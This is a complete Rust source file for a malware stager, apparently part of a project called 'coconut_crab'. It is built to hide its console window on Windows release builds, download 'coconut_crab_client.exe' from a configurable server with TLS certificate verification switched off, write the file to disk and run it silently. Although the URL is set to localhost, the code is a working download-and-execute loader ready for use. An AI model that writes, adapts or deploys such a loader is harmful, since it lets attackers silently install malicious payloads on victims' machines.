#![cfg_attr(all(target_os = "windows", not(debug_assertions)), windows_subsystem = "windows")]

use std::{ process::Command, io::Write, fs::File };

use coconut_crab_lib::web::client::web_get_recv_bytes;

/*

    +---------------------+
    | CONFIGURATION START |
    +---------------------+

*/
// Configure URL of server download [required]
const URL: &str = "https://127.0.0.1:3000/download/coconut_crab_client.exe";
// Configure filename of download [required]
const FILENAME: &str = "coconut_crab_client.exe";
// Configure whether to verify the web certificate of the server [required]
const VERIFY_SERVER: bool = false;

/*

    +-------------------+
    | CONFIGURATION END |
    +-------------------+

*/

fn main() {
    {
        let content = web_get_recv_bytes(&String::from(URL), &VERIFY_SERVER).expect(
            "Unable to get content"
        );
        let mut file = File::create(FILENAME).expect("Unable to open file");
        file.write_all(&content).expect("Failed to write data to file");
        file.sync_all().expect("Failed to complete file io operations");
    }

    Command::new(format!("./{}", FILENAME)).output().expect("Failed to execute file");
}
